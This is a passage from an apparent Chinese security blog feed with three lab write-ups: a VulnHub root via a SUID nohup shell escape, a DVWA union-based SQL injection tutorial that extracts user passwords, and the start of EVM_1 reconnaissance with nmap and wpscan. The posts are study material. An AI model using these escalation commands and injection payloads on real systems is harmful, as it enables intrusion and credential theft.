定时任务没有执行_linux定时任务没有执行_hyfstyle的博客-CSDN博客</a></p><p><img src="/pic/338a98313194eab353fafe5e007d7fd1_MD5.png"></p><blockquote><p>出现的一个疑问</p></blockquote><p><img src="/pic/kali-linux-2022.1-vmware-amd64-2023-06-29-22-14-27.png"></p><p>看看 s 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/tmp$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>    11165    376 -rwsr-xr--   1 root     dip        382696 Feb 11  2020 /usr/sbin/pppd<br>      676     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec<br>     1173     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newuidmap<br>     2278     76 -rwsr-xr-x   1 root     root        76496 Mar 22  2019 /usr/bin/chfn<br>     1172     40 -rwsr-xr-x   1 root     root        37136 Mar 22  2019 /usr/bin/newgidmap<br>      469     40 -rwsr-xr-x   1 root     root        40344 Mar 22  2019 /usr/bin/newgrp<br>     2226    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo<br>      950     36 -rwsr-xr-x   1 root     root        35000 Jan 18  2018 /usr/bin/nohup<br>     2279     44 -rwsr-xr-x   1 root     root        44528 Mar 22  2019 /usr/bin/chsh<br>     2471     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils<br>      690     52 -rwsr-sr-x   1 daemon   daemon      51464 Feb 20  2018 /usr/bin/at<br>     2282     60 -rwsr-xr-x   1 root     root        59640 Mar 22  2019 /usr/bin/passwd<br>     2281     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd<br>    10977     24 -rwsr-xr-x   1 root     root        22528 Jun 28  2019 /usr/bin/arping<br>    11027    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br>     6886     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>      702     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>     7602    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>     1316     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>      512    108 -rwsr-sr-x   1 root     root         109432 Oct 30  2019 /usr/lib/snapd/snap-confine<br>   393274     44 -rwsr-xr-x   1 root     root          43088 Mar  5  2020 /bin/mount<br>   393281     44 -rwsr-xr-x   1 root     root          44664 Mar 22  2019 /bin/su<br>   393282     28 -rwsr-xr-x   1 root     root          26696 Mar  5  2020 /bin/umount<br>   393601     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping<br>   393285     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount<br></code></pre></td></tr></table></figure><p>先尝试 helper 提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/tmp$ systemd-run -t bash<br>Failed to start transient service unit: Interactive authentication required.<br></code></pre></td></tr></table></figure><h3 id="nohup-suid-提权"><a href="#nohup-suid-提权" class="headerlink" title="nohup suid 提权"></a>nohup suid 提权</h3><p>借助于 gtfobins</p><p><img src="/pic/1d097e3d83a5b88047258051bf60a815_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">dlink@victim01:/tmp$ /usr/bin/nohup /bin/sh -p -c <span class="hljs-string">&quot;sh -p &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&quot;</span><br>/usr/bin/nohup: ignoring input and appending output to <span class="hljs-string">&#x27;nohup.out&#x27;</span><br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># id</span><br>uid=1002(dlink) gid=1004(dlink) euid=0(root) <span class="hljs-built_in">groups</span>=1004(dlink)<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls</span><br>flag.txt  snap<br><span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:ce:<span class="hljs-built_in">fc</span>:4b brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.120/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 599sec preferred_lft 599sec<br>    inet6 fe80::a00:27ff:fece:fc4b/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-comment"># uname -a</span><br>Linux victim01 4.15.0-96-generic <span class="hljs-comment">#97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-comment"># cat flag.txt</span><br>Nice work!<br><br>                .:<span class="hljs-comment">##:::.</span><br>              .:::::/;;\:.<br>        ()::::::@::/;;<span class="hljs-comment">#;|:.</span><br>        ::::<span class="hljs-comment">##::::|;;##;|::</span><br>         <span class="hljs-string">&#x27;:::::::::\;;;/::&#x27;</span><br>              <span class="hljs-string">&#x27;:::::::::::</span><br><span class="hljs-string">               |O|O|O|O|O|O</span><br><span class="hljs-string">               :#:::::::##::.</span><br><span class="hljs-string">              .:###:::::#:::::.</span><br><span class="hljs-string">              :::##:::::::::::#:.</span><br><span class="hljs-string">               ::::;:::::::::###::.</span><br><span class="hljs-string">               &#x27;</span>:::;::<span class="hljs-comment">###::;::#:::::</span><br>                ::::;::<span class="hljs-comment">#::;::::::::::</span><br>                :<span class="hljs-comment">##:;::::::;::::###:::     .</span><br>              .:::::; .:::<span class="hljs-comment">##::::::::::::::::</span><br>              ::::::; :::::::::::::::::<span class="hljs-comment">##::  #rootdance</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/06/a671dd67ea4a.html"/>
    <url>/2023/06/a671dd67ea4a.html</url>
    
    <content type="html"><![CDATA[<h1 id="mysql-联合查询"><a href="#mysql-联合查询" class="headerlink" title="mysql 联合查询"></a>mysql 联合查询</h1><h2 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h2><p>1.在参数后边加 ‘, “, ), )), ‘),’)), “),”)), %,%),%))等等尝试进行闭合 看是否会报错。报错就一定存在sql注入。</p><p>2.在参数后边加 and 1&#x3D;1,and 1&#x3D;2, or 1&#x3D;1,or 1&#x3D;2, Xor 1&#x3D;1, Xor 1&#x3D;2, ^ 1&#x3D;1, ^ 1&#x3D;2 &#x3D;也可以替换为like 如果显示不一样也存在sql注入漏洞。</p><p>3，还有时间检测， 有时候页面可能没有变化 mysql可以尝试 sleep(5) benchmark(10000000,md(5))， sqlserver使用 wait delay ‘0:0:5’ ，PostgreSQL尝试 PG_sleep(5),Generate_series(1,1000000)尝试。 通过页面响应时间 判断是否存在sql注入。</p><p><img src="/pic/f0a8e8825efac4adba24b12d8648d784_MD5.png"></p><p><img src="/pic/10215f92c470454e7ca2f1b16d30dbcb_MD5.png"></p><p>输入：1’报错，说明此处存在SQL注入</p><h2 id="确定注入类型（联合查询）"><a href="#确定注入类型（联合查询）" class="headerlink" title="确定注入类型（联合查询）"></a>确定注入类型（联合查询）</h2><ul><li>union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询，但当使用 union select 的时候，需要保证前后查询的列数相同</li><li>用到 order by 来查询字段数</li></ul><p><img src="/pic/f7e77312202a73933cd3dadf095a9e05_MD5.png"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">version</span>(),<span class="hljs-comment">@@</span>version_compile_os<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><ul><li>获取数据库版本和操作系统</li></ul><p><img src="/pic/7f00d3f3bd8501d5ab9f11621e44de1f_MD5.png"></p><p><img src="/pic/3512c9d428ca9fc2432bc28743701f70_MD5.png"></p><p><img src="/pic/f5921b99f422c0f98566932497033e31_MD5.png"></p><h2 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">database</span>(),<span class="hljs-title">user</span>()#</span><br></code></pre></td></tr></table></figure><ul><li>database()将会返回当前网站所使用的数据库名字</li><li>user()将会返回执行当前查询的用户名（查看是否有root权限）</li></ul><p><img src="/pic/50b63ee86d45ee3146509cfda259eb67_MD5.png"></p><p><img src="/pic/1ddd38d2bf544e78e6ab2432042567c5_MD5.png"></p><h2 id="查询数据库表名"><a href="#查询数据库表名" class="headerlink" title="查询数据库表名"></a>查询数据库表名</h2><ul><li>information_schema 是 MySQL 自带的数据库，这张数据表保存了 MySQL 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限等。</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> table_name,table_schema <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema= <span class="hljs-string">&#x27;dvwa&#x27;</span><span class="hljs-meta">#</span><br><span class="hljs-meta">## 查询information_schema中的tables表的table_name列和table_schema列，即DBMS 中的存储的表名和表名所在的数据库</span><br></code></pre></td></tr></table></figure><p><img src="/pic/f87ba8c4e035364337bd26d5c076c246_MD5.png"></p><ul><li>dvwa 数据库有 2 个数据表</li><li>表名为 guestbook 和 users</li></ul><p><img src="/pic/3b6c177571e8ee90be7b46c9f7f766fb_MD5.png"></p><h2 id="猜解数据库字段名及爆库"><a href="#猜解数据库字段名及爆库" class="headerlink" title="猜解数据库字段名及爆库"></a>猜解数据库字段名及爆库</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="/pic/7d9366ba86a79221fc8e879e14b2a32e_MD5.png"></p><p><img src="/pic/fe6daa7617d6ee968da8d4231264aa5f_MD5.png"></p><p>这些字段中最敏感的是 user,password 这两个字段，所以输入：1’ union select user,password from users#进行查询。</p><p><img src="/pic/c7a9a08fb0e1cd411a656772936b5869_MD5.png"></p><p>成功爆出用户名和密码</p><p><img src="/pic/7e2af6a51bebe505808111ce70e547b8_MD5.png"></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>postgraduate</category>
      
      <category>experiment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>EVM_1 靶机</title>
    <link href="/2023/06/0c6297e238cc.html"/>
    <url>/2023/06/0c6297e238cc.html</url>
    
    <content type="html"><![CDATA[<h1 id="EVM-1-靶机"><a href="#EVM-1-靶机" class="headerlink" title="EVM_1 靶机"></a>EVM_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.103   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 04:08 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.000073s latency).<br>Not shown: 65528 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:06:73:F2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.41 seconds<br></code></pre></td></tr></table></figure><p>开启了22,53,80,110,139,143,445 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,53,80,110,139,143,445 192.168.56.103<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 04:08 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.00031s latency).<br><br>PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 a2:d3:34:13:62:b1:18:a3:<span class="hljs-built_in">dd</span>:db:35:c5:5a:b7:c0:78 (RSA)<br>|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)<br>|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)<br>53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)<br>| dns-nsid: <br>|_  bind.version: 9.10.3-P4-Ubuntu<br>80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>110/tcp open  pop3        Dovecot pop3d<br>|_pop3-capabilities: CAPA TOP RESP-CODES SASL AUTH-RESP-CODE UIDL PIPELINING<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp open  imap        Dovecot imapd<br>|_imap-capabilities: ENABLE have ID LOGINDISABLEDA0001 more post-login IMAP4rev1 IDLE listed capabilities SASL-IR OK Pre-login LOGIN-REFERRALS LITERAL+<br>445/tcp open  `�J�V      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>MAC Address: 08:00:27:06:73:F2 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-06-27T08:09:05<br>|_  start_date: N/A<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine<br>|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00<br>|   Domain name: \x00<br>|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine<br>|_  System time: 2023-06-27T04:09:05-04:00<br>|_clock-skew: mean: 1h19m57s, deviation: 2h18m33s, median: -2s<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.99 seconds<br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,53,80,110,139,143,445 192.168.56.103 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 04:09 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.00024s latency).<br><br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /wordpress/: Blog</span><br><span class="hljs-string">|   /info.php: Possible information file</span><br><span class="hljs-string">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-slowloris-check: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Slowloris DOS attack</span><br><span class="hljs-string">|     State: LIKELY VULNERABLE</span><br><span class="hljs-string">|     IDs:  CVE:CVE-2007-6750</span><br><span class="hljs-string">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="hljs-string">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="hljs-string">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="hljs-string">|       the http server\&#x27;</span>s resources causing Denial Of Service.<br>|       <br>|     Disclosure <span class="hljs-built_in">date</span>: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:06:73:F2 (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>|_smb-vuln-ms10-061: <span class="hljs-literal">false</span><br>| smb-vuln-regsvc-dos: <br>|   VULNERABLE:<br>|   Service regsvc <span class="hljs-keyword">in</span> Microsoft Windows systems vulnerable to denial of service<br>|     State: VULNERABLE<br>|       The service regsvc <span class="hljs-keyword">in</span> Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference<br>|       pointer. This script will crash the service <span class="hljs-keyword">if</span> it is vulnerable. This vulnerability was discovered by Ron Bowes<br>|       <span class="hljs-keyword">while</span> working on smb-enum-sessions.<br>|_          <br>|_smb-vuln-ms10-054: <span class="hljs-literal">false</span><br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 321.68 seconds<br><br></code></pre></td></tr></table></figure><p>漏洞脚本扫描得到了 wordpress 目录和 info.php，先尝试 smb 脚本扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse  192.168.56.103 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 04:25 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.103<br>Host is up (0.000092s latency).<br>Not shown: 993 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>53/tcp  open  domain<br>80/tcp  open  http<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:06:73:F2 (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: guest<br>|   \\192.168.56.103\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (ubuntu-extermely-vulnerable-m4ch1ine server (Samba, Ubuntu))<br>|     Users: 2<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\192.168.56.103\<span class="hljs-built_in">print</span>$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\printers<br>|     Anonymous access: &lt;none&gt;<br>|_    Current user access: &lt;none&gt;<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.47 seconds<br></code></pre></td></tr></table></figure><h2 id="Wordpress-渗透"><a href="#Wordpress-渗透" class="headerlink" title="Wordpress 渗透"></a>Wordpress 渗透</h2><h3 id="wpscan-扫描"><a href="#wpscan-扫描" class="headerlink" title="wpscan 扫描"></a>wpscan 扫描</h3><p>看来 smb 突破点较少，那就将关注点放在 wordpress，使用 wpscan 来进行信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Desktop/Clash <span class="hljs-keyword">for</span> Windows-0.19.26-x64-linux]<br>└─$ wpscan --url http://192.168.56.103/wordpress --enumerate u       <br>Type application/netcdf is already registered as a variant of application/netcdf.<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ 